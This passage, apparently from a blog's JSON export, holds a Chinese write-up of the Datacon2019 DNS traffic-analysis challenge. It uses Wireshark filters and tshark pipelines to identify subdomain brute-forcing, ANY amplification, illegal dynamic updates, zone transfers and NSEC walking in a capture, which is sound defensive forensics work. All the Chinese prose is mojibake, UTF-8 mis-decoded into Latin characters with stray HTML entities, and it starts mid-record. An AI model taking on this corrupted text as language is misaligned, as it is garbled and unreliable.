ç‰¹å¾å­—æ®µï¼šdns.flags.rcode dns.flags.rcode != 0(No Error) dns.flags.rcode == 3(No such name) â€”&gt; DoSæ”»å‡»","tags":[{"name":"Wireshark","slug":"Wireshark","permalink":"http://ca0y1h.top/tags/Wireshark/"},{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"http://ca0y1h.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"DNS","slug":"DNS","permalink":"http://ca0y1h.top/tags/DNS/"},{"name":"Datacon2019","slug":"Datacon2019","permalink":"http://ca0y1h.top/tags/Datacon2019/"}],"categories":[{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"æ¯”èµ›é¢˜","slug":"æµé‡åˆ†æ/æ¯”èµ›é¢˜","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%AF%94%E8%B5%9B%E9%A2%98/"}]},{"title":"Datacon2019-q1-Writeup-v1","date":"2019-07-15T12:44:20.000Z","path":"Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1/","text":"Datacon2019-q1-Writeup-v1 ä¸€ã€é¢˜ç›®è¯´æ˜ é¢˜ç›®èƒŒæ™¯ å‡å¦‚ä½ æ˜¯æŸç½‘ç»œçš„ç®¡ç†å‘˜ï¼Œè¿‘æ—¥æ¥åˆ°å‘Šè­¦ç§°ï¼Œç½‘ç»œä¸­å­˜åœ¨ DNS æ”»å‡»è¡Œä¸ºï¼Œå¸Œæœ›ä½ è¿›è¡Œè°ƒæŸ¥ã€‚ç°æ•è·åˆ°ç½‘ç»œä¸­çš„ DNS æµé‡ï¼Œè¯·å¯¹å…¶ä¸­çš„æ”»å‡»è¡Œä¸ºè¿›è¡Œåˆ†æã€‚ é¢˜ç›®è¦ç‚¹ DNSæ˜¯äº’è”ç½‘ä¸­é‡è¦çš„åŸºç¡€è®¾æ–½ä¹‹ä¸€ï¼Œå¯¹ç½‘ç»œçš„ç¨³å®šè¿è¡Œæœ‰è‡³å…³é‡è¦çš„ä½œç”¨ã€‚ç„¶è€Œï¼Œç”±äºè®¾è®¡ç¼ºé™·ï¼ŒDNS å­˜åœ¨è¯¸å¤šè„†å¼±ç‚¹ï¼Œå› æ­¤å¯è¢«åˆ©ç”¨ä¸è¯¸å¤šæ”»å‡»ã€‚æœ¬é¢˜å¯¹å¸¸è§çš„ DNS å®‰å…¨é—®é¢˜è¿›è¡Œè€ƒå¯Ÿã€‚ äºŒã€çŸ¥è¯†å‚¨å¤‡ DNSåè®®åŠæŠ¥æ–‡æ ¼å¼ è¿™ç¯‡æ–‡ç« å¯¹äºDNSè®²çš„è¿˜æ¯”è¾ƒé€å½»ï¼Œåœ¨æ­¤åŸºç¡€åšä¸€ç‚¹æ‘˜è¦ã€‚ åŸŸåå±‚æ¬¡ç»“æ„ åŸŸåå±‚æ¬¡ åŸŸåæœåŠ¡å™¨ å¦å¤–è¿˜æœ‰ä¸€ä¸ªæœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼šå½“ä¸€ä¸ªä¸»æœºå‘å‡ºDNSæŸ¥è¯¢è¯·æ±‚çš„æ—¶å€™ï¼Œè¿™ä¸ªæŸ¥è¯¢è¯·æ±‚é¦–å…ˆå°±æ˜¯å‘ç»™æœ¬åœ°åŸŸåæœåŠ¡å™¨çš„ã€‚ åŸŸåè§£æè¿‡ç¨‹ ä»¥æŸ¥è¯¢jocent.meä¸ºä¾‹ï¼Œå…¶ä¸­10.74.36.90ä¸ºä¸»æœºIPï¼Œ10.74.1.11ä¸ºæœ¬åœ°DNSæœåŠ¡å™¨ï¼š â‘ ä¸»æœº10.74.36.90å…ˆå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨10.74.1.11è¿›è¡Œé€’å½’æŸ¥è¯¢ â‘¡æœ¬åœ°åŸŸåæœåŠ¡å™¨é‡‡ç”¨è¿­ä»£æŸ¥è¯¢ï¼Œå‘ä¸€ä¸ªæ ¹åŸŸåæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ â‘¢æ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œä¸‹ä¸€æ¬¡åº”è¯¥æŸ¥è¯¢çš„é¡¶çº§åŸŸåæœåŠ¡å™¨dns.meçš„IPåœ°å€ â‘£æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘é¡¶çº§åŸŸåæœåŠ¡å™¨dns.meè¿›è¡ŒæŸ¥è¯¢ â‘¤é¡¶çº§åŸŸåæœåŠ¡å™¨meå‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œä¸‹ä¸€æ­¥æŸ¥è¯¢æƒé™æœåŠ¡å™¨dns.jocent.meçš„IPåœ°å€ â‘¥æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æƒé™æœåŠ¡å™¨dns.jocent.meè¿›è¡ŒæŸ¥è¯¢ â‘¦æƒé™æœåŠ¡å™¨dns.jocent.meå‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨æ‰€æŸ¥è¯¢çš„ä¸»æœºçš„IPåœ°å€ â‘§æœ¬åœ°åŸŸåæœåŠ¡å™¨æœ€åæŠŠæŸ¥è¯¢ç»“æœå‘Šè¯‰ 10.74.36.90 å…¶ä¸­æœ‰ä¸¤ä¸ªæ¦‚å¿µé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢: é€’å½’æŸ¥è¯¢ï¼šæœ¬æœºå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘å‡ºä¸€æ¬¡æŸ¥è¯¢è¯·æ±‚ï¼Œå°±é™å¾…æœ€ç»ˆçš„ç»“æœã€‚å¦‚æœæœ¬åœ°åŸŸåæœåŠ¡å™¨æ— æ³•è§£æï¼Œè‡ªå·±ä¼šä»¥DNSå®¢æˆ·æœºçš„èº«ä»½å‘å…¶å®ƒåŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œç›´åˆ°å¾—åˆ°æœ€ç»ˆçš„IPåœ°å€å‘Šè¯‰æœ¬æœºã€‚ è¿­ä»£æŸ¥è¯¢ï¼šæœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æ ¹åŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œæ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰å®ƒä¸‹ä¸€æ­¥åˆ°å“ªé‡Œå»æŸ¥è¯¢ï¼Œç„¶åå®ƒå†å»æŸ¥ï¼Œæ¯æ¬¡å®ƒéƒ½æ˜¯ä»¥å®¢æˆ·æœºçš„èº«ä»½å»å„ä¸ªæœåŠ¡å™¨æŸ¥è¯¢ã€‚ æŠ¥æ–‡æ ¼å¼ DNSèµ„æºè®°å½•ANYç±»å‹ ä¸ºä»€ä¹ˆåœ¨DDOSæ–¹æ³•æ”»å‡»çš„æ—¶å€™éœ€è¦æŒ‡å®šANYç±»å‹å‚æ•°ï¼Œæˆ‘ä»¬ä½¿ç”¨digå‘½ä»¤æ¥çœ‹ä¸€ä¸‹å…·ä½“æƒ…å†µï¼š å¯ä»¥çœ‹åˆ°ï¼ŒDNSæœåŠ¡å™¨è¿”å›äº†è¯¥æœåŠ¡å™¨ä¸­æ‰€æœ‰å…³äº163.comçš„èµ„æºè®°å½•ï¼ŒåŒ…æ‹¬ç±»å‹Aï¼ŒNSï¼ŒMXï¼ŒTXTï¼Œè¿™æ ·å°±ä½¿å¾—å“åº”æ•°æ®åŒ…è¿œè¿œå¤§äºè¯·æ±‚æ•°æ®åŒ…ã€‚ æˆ‘ä»¬ä¸å¦¨å†å¾€æ·±å±‚æ¬¡æƒ³ä¸€æƒ³ï¼Œå·²çŸ¥UDPæ•°æ®åŒ…çš„æœ€å¤§é•¿åº¦æ˜¯512å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´å½“DNSå“åº”æ•°æ®å¤§äº512å­—èŠ‚çš„æ—¶å€™ï¼Œæ•°æ®åªè¿”å›512å­—èŠ‚ï¼Œå‰©ä½™çš„æ•°æ®å°†è¢«ä¸¢å¼ƒã€‚ä¸ºä»€ä¹ˆåœ¨è¿™ä¸ªåœ°æ–¹DNSçš„å“åº”æ•°æ®å¯ä»¥è¿”å›å¤§äº2000å­—èŠ‚çš„æ•°æ®å‘¢ï¼Ÿå¯ä»¥å»æŸ¥çœ‹è¯·æ±‚æ•°æ®åŒ…ä¸­çš„Additional Recordsæœ‰ä¸€æ¡OPTç±»å‹çš„èµ„æºè®°å½•ï¼ŒOPTç±»å‹æ˜¯ä¸€ç§ä¸€ä¸ªâ€œä¼ª DNSè®°å½•ç±»å‹â€ä»¥æ”¯æŒ EDNSåè®®ï¼Œå…¶ä¸­UDP Payload Sizeå­—æ®µå¯ä»¥æŒ‡å®šDNSè¿”å›æŠ¥æ–‡çš„æœ€å¤§é•¿åº¦ã€‚è¿™é‡Œå¯¹EDNSæœ‰æ¯”è¾ƒè¯¦ç»†çš„è§£é‡Šã€‚ DNSæ”»å‡»ç±»å‹ è¿™é‡Œæœ‰å¯¹DNSçš„å„ç§æ”»å‡»ç±»å‹çš„ä»‹ç»ã€‚ dns.flags.optå¸¸è§çš„å€¼ dns.flags.opcode=0(åªæ˜¾ç¤ºDNSå¸¸è§„æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯) dns.flags.opcode=1(åªæ˜¾ç¤ºDNSé€†å‘æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯) dns.flags.opcode=2(åªæ˜¾ç¤ºDNSæœåŠ¡å™¨çŠ¶æ€è¯·æ±‚æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSæœåŠ¡å™¨çŠ¶æ€å“åº”æ¶ˆæ¯) dns.flags.opcode=5(åªæ˜¾ç¤ºDNSåŠ¨æ€æ›´æ–°æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSåŠ¨æ€æ›´æ–°å“åº”æ¶ˆæ¯ï¼‰ DNSèµ„æºè®°å½•ï¼ˆRRï¼‰ç±»å‹â€”â€”NSå’ŒSOA NSå’ŒSOAçš„åŒºåˆ« SOAï¼Œå³Start Of Authorityï¼Œæ”¾åœ¨ zone file ä¸­ï¼Œç”¨äºæè¿°è¿™ä¸ª zone è´Ÿè´£çš„ name serverï¼Œversion numberâ€¦ç­‰èµ„æ–™ï¼Œä»¥åŠå½“ slave server è¦å¤‡ä»½è¿™ä¸ª zone æ—¶çš„ä¸€äº›å‚æ•°ã€‚æ¯ä¸ª zone file ä¸­å¿…é¡»æœ‰ä¸”ä»…æœ‰ä¸€æ¡ SOARR ï¼Œå¹¶åœ¨ zone file ä¸­ä½œä¸ºç¬¬ä¸€æ¡èµ„æºè®°å½•ä¿å­˜ã€‚ DNSèµ„æºè®°å½•ï¼ˆRRï¼‰ç±»å‹â€”â€”AXFRå’ŒIXFR AXFRï¼ˆå®Œå…¨åŒºåŸŸä¼ è¾“ 252ï¼‰ï¼šç”±ä¸»åŸŸåæœåŠ¡å™¨è½¬ç§»æ•´ä¸ªåŒºåŸŸæ–‡ä»¶è‡³è¾…åŠ©åŸŸåæœåŠ¡å™¨ã€‚ IXFRï¼ˆå¢é‡åŒºåŸŸä¼ è¾“ 251ï¼‰ï¼šè¯·æ±‚åªæœ‰ä¸å…ˆå‰æµæ°´å¼ç¼–å·ä¸åŒçš„ç‰¹å®šåŒºåŸŸçš„åŒºåŸŸè½¬ç§»ã€‚æ­¤è¯·æ±‚æœ‰æœºä¼šè¢«æ‹’ç»ï¼Œå¦‚æœæƒå¨æœåŠ¡å™¨ç”±äºé…ç½®æˆ–ç¼ºä¹å¿…è¦çš„æ•°æ®è€Œæ— æ³•å±¥è¡Œè¯·æ±‚ï¼Œä¸€ä¸ªå®Œæ•´çš„ï¼ˆAXFRï¼‰ä¼šè¢«å‘é€ä»¥ä½œå›åº”ã€‚ è¯¦ç»†ä»‹ç» DNSSECåè®® æµ…è°ˆDNSåŸŸåå®‰å…¨æ‰©å±•åè®®DNSSEC ä¸‰ã€è§£é¢˜è¿‡ç¨‹ 1.å­åŸŸåçˆ†ç ´æ”»å‡» æ”»å‡»åŸç† ä¼ é€é—¨ å‘ç°è¿‡ç¨‹ é¦–å…ˆï¼Œç”¨ Wireshark æ‰“å¼€ pcap åŒ…ï¼Œç»˜åˆ¶ IO Graphsï¼š å¯è§ï¼Œåœ¨ 5500 - 6000s ä¸­å‡ºç°äº†å¼‚å¸¸çš„å³°å€¼æµé‡ï¼Œå°†5500såˆ°6000sæ‰€æœ‰è¯·æ±‚ã€å“åº”æå–åˆ°æ–°çš„ pcapæ–‡ä»¶ã€‚ æ¥ä¸‹æ¥ä½¿ç”¨ åè®®åˆ†çº§ æŸ¥çœ‹å“ªäº›åè®®å æ¯”æœ€å¤šï¼š å¯ä»¥çœ‹åˆ°ï¼Œåˆ‡å‡ºæ¥çš„åŒ…é‡Œé¢ä»…æœ‰DNSåè®®ï¼Œè€Œä¸”ç”¨æˆ·ä¸»åŠ¨å‘é€çš„æ•°æ®åŒ…å æ¯”æœ€å¤§ã€‚ æŸ¥çœ‹åˆ†ç»„é•¿åº¦ é•¿åº¦ä¸º1280~2559å­—èŠ‚çš„æ•°æ®åŒ…é€šå¸¸è¡¨ç¤ºæ•°æ®ä¼ è¾“ï¼Œé•¿åº¦è¾ƒå°çš„æ•°æ®åŒ…åˆ™è¡¨ç¤ºåè®®æ§åˆ¶åºåˆ— ä»¥è¯·æ±‚æ•°é‡ä»é«˜åˆ°ä½çš„ IP åœ°å€è¿›è¡Œæ’åºã€‚ æ–¹æ³•ä¸€(é€Ÿåº¦å¾ˆæ…¢)ï¼š ä½¿ç”¨wiresharkçš„ç»Ÿè®¡åŠŸèƒ½ï¼Œå¹¶ä¸”ç”¨dns.flags.response == 0è¿›è¡Œç­›é€‰(åªçœ‹DNSæŸ¥è¯¢æŠ¥æ–‡)ï¼š æ–¹æ³•äºŒï¼š ä½¿ç”¨tsharkå‘½ä»¤è¡Œè¿›è¡Œç­›é€‰tshark -r timeTop.pcap -T fields -e ip.src -e ip.dst | tr &quot;\\t&quot; &quot;\\n&quot; | sort | uniq -c | sort -nr &gt; ipRank.txt å‚æ•°è§£é‡Šï¼š -r æŒ‡å®šç›®æ ‡æ–‡ä»¶ -Y æŒ‡å®šè¿‡æ»¤è§„åˆ™ -T pdml|ps|text|fields|psml,è®¾ç½®è§£ç ç»“æœè¾“å‡ºçš„æ ¼å¼ï¼ŒåŒ…æ‹¬text,ps,psmlå’Œpdmlï¼Œé»˜è®¤ä¸ºtext -e å¦‚æœ-T fieldsé€‰é¡¹æŒ‡å®šï¼Œ-eç”¨æ¥æŒ‡å®šè¾“å‡ºå“ªäº›å­—æ®µ é¦–å…ˆæŸ¥çœ‹ç¬¬ä¸€ä¸ªIP 45.80.170.1ï¼š å¯ä»¥çœ‹åˆ°è¿™ä¸ªIPåœ°å€æ˜¯ä¸€ä¸ªDNSæœåŠ¡ã€‚ å†æ¥æŸ¥çœ‹ç¬¬äºŒä¸ªIP 144.202.64.226ï¼š 144.202.64.226 å‘èµ·äº†å¤§é‡é’ˆå¯¹b0e.com.cnåŸŸåçš„æŸ¥è¯¢è¯·æ±‚ï¼Œä¸”å¤§éƒ¨åˆ†ç›¸åº”ç»“æœå‡ä¸º No such nameï¼Œå› æ­¤åˆ¤æ–­æ­¤ç±»æ”»å‡»ä¸ºå­åŸŸåçˆ†ç ´æ”»å‡»ã€‚ é€šè¿‡è§‚å¯Ÿï¼Œå¯ä»¥å‘ç°ï¼Œå‰ 10 ä¸ªè¯·æ±‚å¹¶ä¸æ˜¯åŸŸåçˆ†ç ´æ”»å‡»ï¼Œå»æ‰è¯¥ 10 ä¸ªè¯·æ±‚åï¼Œç¬¬ä¸€ç±»æ”»å‡»å…±æœ‰ 34184 ä¸ªã€‚ 2. DDOSåå°„æ”¾å¤§æ”»å‡» æ”»å‡»åŸç† æµé‡æ”¾å¤§ï¼šåˆ©ç”¨å›å¤åŒ…æ¯”è¯·æ±‚åŒ…å¤§çš„ç‰¹ç‚¹ åœ°å€ä¼ªé€ ï¼šä¼ªé€ è¯·æ±‚åŒ…çš„æºåœ°å€ä¸ºæ”»å‡»ç›®æ ‡ åˆ†å¸ƒå¼ï¼šå¤šä¸ª DNS åŒæ—¶å‘æ”»å‡»ç›®æ ‡è¿”å›å¤§é‡å“åº” æ”»å‡»ç‰¹å¾ é€šè¿‡é€’å½’æŸ¥è¯¢ä»è€Œæ”¾å¤§æµé‡ï¼Œå› æ­¤recursion=1ï¼ŒANYå‚æ•°ï¼ˆä¸ºä»€ä¹ˆå¿…é¡»æ˜¯ANYå‚æ•°ï¼‰ã€‚ è¦æ±‚è¿”å›åŒ…è¿œè¿œå¤§äºå‘é€åŒ…ï¼Œä¸€èˆ¬è¿”å›åŒ…çš„è¦æ±‚å¤§äº3000ã€‚å³dns.rr.udp_payload_size&gt;=3000ã€‚ å‘ç°è¿‡ç¨‹ é€šè¿‡æ”»å‡»ç‰¹å¾å¯ä»¥å¾—å‡ºç­›é€‰æ¡ä»¶dns.flags.response == 0 &amp;&amp; dns.flags.recdesired == 1 &amp;&amp; dns.qry.type == 255 &amp;&amp; dns.rr.udp_payload_size &gt;= 3000ï¼Œå†å¯¹ç­›é€‰åçš„IPåœ°å€è¿›è¡Œç»Ÿè®¡ï¼štshark -r q1_final.pcap -Y &quot;dns.flags.recdesired==1 &amp;&amp; dns.flags.response==0 &amp;&amp; dns.rr.udp_payload_size&gt;=3000 &amp;&amp; dns.qry.type==255&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c| sort -nr|more è¿™æ ·å°±è¿‡æ»¤å‡ºäº† DNS æœåŠ¡å“åº”æ•°æ®äº†ï¼Œä¸€å…±æœ‰188.141.167.218ï¼Œ187.199.129.12ï¼Œ70.85.232.160ï¼Œ45.80.170.1å››ä¸ªDNSæœåŠ¡å™¨ï¼Œæ¥ç€æ’é™¤ä¸æ”¯æŒ ANY çš„ DNS æœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯ Refusedï¼š æ’æŸ¥ä¹‹åï¼Œå¯çŸ¥æ”»å‡»IPï¼ˆä¹Ÿå°±æ˜¯æ’é™¤ç›®çš„IPä¸º45.80.170.1çš„æºIPï¼‰ï¼š127.130.104.152ï¼Œ175.222.102.169ï¼Œ105.191.150.205ã€‚ 3. éæ³•DNS åŠ¨æ€æ›´æ–°æ”»å‡» æ”»å‡»åŸç† è¿™é‡Œå¯¹DNS Dynamic Updateæœ‰æ¯”è¾ƒè¯¦ç»†çš„ä»‹ç»ã€‚ç®€å•åœ°æ¥è¯´ï¼ŒDNS å®¢æˆ·ç«¯åœ¨ IP åœ°å€æˆ–åç§°å‡ºç°æ›´æ”¹çš„ä»»ä½•æ—¶å€™éƒ½å¯åˆ©ç”¨ DNS æœåŠ¡å™¨æ¥æ³¨å†Œå’ŒåŠ¨æ€æ›´æ–°å…¶èµ„æºè®°å½•ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ IP æ¬ºéª—ä¼ªè£…æˆ DNS æœåŠ¡å™¨ä¿¡ä»»çš„ä¸»æœºå¯¹åŒºæ•°æ®è¿›è¡Œæ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ã€‚ æ”»å‡»ç‰¹å¾ï¼š dns.flags.opt==5æ˜¾ç¤ºDNSåŠ¨æ€æ›´æ–°æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSåŠ¨æ€æ›´æ–°å“åº”æ¶ˆæ¯ å‘ç°è¿‡ç¨‹ ä½¿ç”¨tsharkå‘½ä»¤ç­›é€‰ï¼štshark -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -nr|more å¯ä»¥çœ‹åˆ°ï¼Œæœ‰å››ä¸ªæ”»å‡»IPï¼š19.220.251.87 414ï¼Œ200.152.141.106 15ï¼Œ18.100.48.86 4091ï¼Œ237.205.156.233 535 4. éæ³•DNSåŸŸä¼ è¾“æ”»å‡» æ”»å‡»åŸç† è¾… DNS æœåŠ¡å™¨ï¼Œéœ€è¦ä¸ä¸» DNS æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼ŒåŠ è½½æ•°æ®ä¿¡æ¯ï¼Œç§°ä¸ºåŒºåŸŸä¼ é€ï¼ˆZone Transferï¼‰ã€‚AXFR è¯·æ±‚ï¼Œå¸¸å¯¼è‡´å…¨åŒºåŸŸä¼ é€ï¼Œéœ€è¦èŠ±è´¹å¤§é‡çš„æ—¶é—´ä¸å¸¦å®½ã€‚ å¤§é‡çš„ AXFR ã€IXFRè¯·æ±‚ï¼Œå¯å¯¼è‡´ DDoSã€‚æƒé™é…ç½®ä¸å½“ï¼Œå¯å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼ˆæµ‹è¯•åŸŸåã€å†…éƒ¨åŸŸåï¼‰ã€‚ æ”»å‡»ç‰¹å¾ dns.flags.repsonse==0 &amp;&amp; dns.qry.type==252 || dns.qry.type==251 å‘ç°è¿‡ç¨‹ æˆ‘ä»¬ç”¨è¿‡æ»¤å™¨dns.qry.type in &#123;251 252&#125;æŠŠAXFRå’ŒIXFRè¿‡æ»¤å‡ºæ¥ï¼ŒæŸ¥çœ‹æœ‰å“ªäº›ç–‘ä¼¼æ”»å‡»IP æœ‰ä¸¤ä¸ª221.223.19.169 å’Œä¸€ä¸ª129.191.74.107 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ï¼Œä»¥åŠå¤§é‡çš„96.199.230.176 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ã€‚ä»”ç»†æ£€æŸ¥ä¸€ä¸‹å‰ä¸¤ä¸ªIPåœ°å€çš„æ•°æ®åŒ…åï¼Œæˆ‘ä»¬è®¤ä¸ºå‰é¢ä¸¤ä¸ªæœ‰å¯èƒ½æ˜¯ç®¡ç†å‘˜é…ç½®ä¸å½“ç­‰é€ æˆçš„ï¼Œ è€Œæœ€åçš„ä¸€ä¸ªå¤§é‡çš„è¯·æ±‚æ•°æ®åŒ…æ˜¾ç„¶å°±æ˜¯åŸŸä¼ é€æ”»å‡»äº†ã€‚ 5. DNSSec NSec åŸŸåéå†æ”»å‡» æ”»å‡»åŸç† DNSSecçš„æ¦‚å¿µä¸ä½œç”¨ NSECï¼šWalking a DNS zone NSECæšä¸¾è¿™æ˜¯é’ˆå¯¹DNSSECçš„ä¸€ç§æ”»å‡»ï¼Œåœ¨æœªä½¿ç”¨NSEC3çš„DNSSECä¸­ï¼Œè‹¥æŸ¥è¯¢åŒºæ–‡ä»¶ä¸­ä¸å­˜åœ¨çš„åŸŸåï¼Œä¼šä»¥NSECè®°å½•çš„å½¢å¼æä¾›é è¿‘å…¶çš„æœ€è¿‘çš„ä¸‹ä¸€æ¡åŸŸåï¼Œè¿™å°±é€ æˆäº†å¯èƒ½æ„é€ ç‰¹æ®Šè¯·æ±‚ï¼Œæ¥éå†åŒºæ–‡ä»¶ï¼Œé€ æˆåŒºæ–‡ä»¶çš„æ³„éœ²ã€‚ æ”»å‡»ç‰¹å¾ åŸŸåéå†æ”»å‡»ä¾èµ–äºNSecèµ„æºè®°å½•ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨``dns.resp.type==47`è¿›è¡Œåˆæ­¥ç­›é€‰ å‘ç°è¿‡ç¨‹ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æŠŠANYåå°„å‹Dosæ”»å‡»ä¹Ÿç­›é€‰å‡ºæ¥äº†ï¼Œäºæ˜¯å†åŠ ä¸Šnot dns.qry.type==255æ¡ä»¶å°±å¯ä»¥å¾—åˆ°DNSSec NSec åŸŸåéå†æ”»å‡»IPï¼š6.116.183.244 å››ã€Q&amp;A pacpåŒ…æ–‡ä»¶è¿‡å¤§ï¼ŒWiresharkåŠ è½½å¤±è´¥ è§£å†³åŠæ³•ï¼šä½¿ç”¨ editcap -c &lt;packets per file&gt; åŸå§‹æ–‡ä»¶.pcap è¾“å‡ºæ–‡ä»¶.pcap å‘½ä»¤ï¼›æˆ–è€…ä½¿ç”¨tcpdump -r old_file -w new_files -C 10ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ¯ä¸ªæ–‡ä»¶çš„å¤§å°æ˜¯10 millionå­—èŠ‚ã€‚ bashç®¡é“æ ¼å¼åŒ–è¾“å‡ºå‘½ä»¤ tr sort -nc sort | uniq -c awk more wc å‡ ä¸ªç»å¸¸ç”¨åˆ°çš„DNSæ˜¾ç¤ºè¿‡æ»¤å™¨çš„å®ä¾‹ dns.flags.response=0(DNSæŸ¥è¯¢æ¶ˆæ¯) dns.flags.response=1(DNSå“åº”æ¶ˆæ¯) dns.flags.rcode=0(æ˜¾ç¤ºRCODEå­—æ®µå€¼ä¸º0(Noerror)çš„DNSåº”ç­”æ¶ˆæ¯) dns.flags.rcode=3(æ˜¾ç¤ºRCODEå­—æ®µå€¼ä¸º3(NXDomain,è¡¨ç¤ºåŸŸåä¸å­˜åœ¨)çš„DNSåº”ç­”æ¶ˆæ¯) dns.flags.opcode=0(æ˜¾ç¤ºDNSå¸¸è§„æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯) dns.flags.opcode=1(æ˜¾ç¤ºDNSé€†å‘æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯) dns.flags.opcode=2(æ˜¾ç¤ºDNSæœåŠ¡å™¨çŠ¶æ€è¯·æ±‚æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSæœåŠ¡å™¨çŠ¶æ€å“åº”æ¶ˆæ¯) dns.flags.opcode=5(æ˜¾ç¤ºDNSåŠ¨æ€æ›´æ–°æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSåŠ¨æ€æ›´æ–°å“åº”æ¶ˆæ¯) dns.flags.recdesired=1(RDæ ‡è®°ä½ç½®1çš„DNSæŸ¥è¯¢æ¶ˆæ¯ä¸€èˆ¬ä¸ºä¸»æœºå‘å‡ºï¼Œç›®çš„æ˜¯è¦æ±‚æ¥å—è¯¥æ¶ˆæ¯çš„DNSæœåŠ¡å™¨æ‰§è¡Œé€’å½’æŸ¥è¯¢) dns.flags.recdesired=0(æ˜¾ç¤ºRDæ ‡è®°ä½ç½®0çš„DNSé€’å½’åå¤æŸ¥è¯¢åŠå“åº”æ¶ˆæ¯) å¸¸ç”¨çš„æŸ¥è¯¢å­—æ®µ å­—æ®µ æè¿° å­—æ®µ æè¿° frame.len æ•°æ®é•¿åº¦ dns.flags.authenticated æœåŠ¡å™¨æ˜¯å¦ä¸ºåŸŸæƒå¨æœåŠ¡å™¨ ip.src æºIP dns.flags.checkisable éè®¤è¯æ•°æ®æ˜¯å¦å¯æ¥æ”¶ ip.dst ç›®çš„IP dns.flags.rcode DNS reply code udp.srcport æºudpç«¯å£å· dns.count.quires æ•°æ®åŒ…ä¸­DNSè¯·æ±‚æ•° udp.dstport ç›®çš„udpç«¯å£å· dns.count.answers æ•°æ®åŒ…ä¸­DNSå›ç­”æ•° eth.src æºMACåœ°å€ dns.count.auth_rr æ•°æ®åŒ…ä¸­æƒå¨è®°å½•æ•° eth.dst ç›®çš„MACåœ°å€ dns.count.add_rr æ•°æ®åŒ…ä¸­é¢å¤–è®°å½•æ•° dns.id DNS Transaction ID dns.qry.name DNSè¯·æ±‚å dns.flags.response DNSè¯·æ±‚/ç°æœ‰å“åº”æ ‡å¿— dns.qry.class DNSè¯·æ±‚ç±»å‹ dns.flags.opcode DNS opcode dns.resp.name DNSå“åº”å dns.flags.authoritative åº”ç­”æ˜¯å¦è¢«æœåŠ¡å™¨è®¤è¯ dns.resp.type DNSå›å¤ç±»å‹ dns.flags.truncated æ¶ˆæ¯æ˜¯å¦è¢«æˆªæ–­ dns.resp.ttl DNSå“åº”ç”Ÿå­˜æ—¶é—´ dns.flags.recdesired æ˜¯å¦é€’å½’æŸ¥è¯¢ dns.resp.z.do DNSæ˜¯å¦æ”¯æŒDNSSEC dns.flags.reavail æœåŠ¡å™¨æ˜¯å¦èƒ½é€’å½’æŸ¥è¯¢ frame.time_relative frameç›¸å¯¹æ—¶é—´ å¸¸ç”¨æŸ¥è¯¢å­—æ®µç±»å‹ TYPE å€¼ å«ä¹‰ A 1 ä¸»æœºåœ°å€ NS 2 æƒå¨æœåŠ¡å™¨ CNAME 5 åˆ«åçš„æ­£åˆ™åç§° SOA 6 æ ‡è®°æƒå¨åŒºåŸŸçš„å¼€å§‹ PTR 12 åŸŸåæŒ‡é’ˆ MX 15 é‚®ä»¶äº¤æ¢ TXT 16 æ–‡æœ¬å­—ç¬¦ä¸² DS 43 å§”æ‰˜ç­¾å‘è€… IXFR 251 å¢é‡åŒºåŸŸè½¬ç§» AXFR 252 æƒå¨åŒºåŸŸè½¬ç§» * 255 æ‰€æœ‰è§£æè®°å½•ï¼Œä¹Ÿæˆä¸ºANY äº”ã€æ€»ç»“ä¸åæ€ 